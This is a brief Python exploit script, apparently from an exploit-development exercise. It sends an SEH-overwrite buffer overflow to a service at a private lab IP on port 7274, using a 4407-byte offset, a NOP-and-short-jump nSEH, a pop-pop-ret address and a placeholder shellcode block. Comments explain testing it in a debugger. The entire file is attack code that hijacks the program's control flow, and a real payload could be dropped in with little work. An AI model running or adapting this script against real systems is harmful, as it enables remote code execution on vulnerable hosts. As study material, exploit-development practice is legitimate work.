#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

host="192.168.2.206"
port=7274

# !mona seh - find address without nullbyte
# for testing, we should put a breakpoint in the address.
# after running the script, we can press shift+f9 and see that after
# the pop pop ret, it will execute the "BBBB" instructions

offset = "A" * 4407

nseh = "\x90\x90" #NOPS
nseh += "\xeb\x06" #JMP short 0x08 -- Since it's instructions and not address, we don't need to care about little endian

seh = pack('<L', 0x727417EA)
shellcode = "D" * 500

payload = offset + nseh + seh + shellcode

buffer = "EXPLOIT2 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))

print("Enviando " + str(len(buffer))  + "bytes")
exp.send(buffer)
print(exp.recv(1024))
exp.close()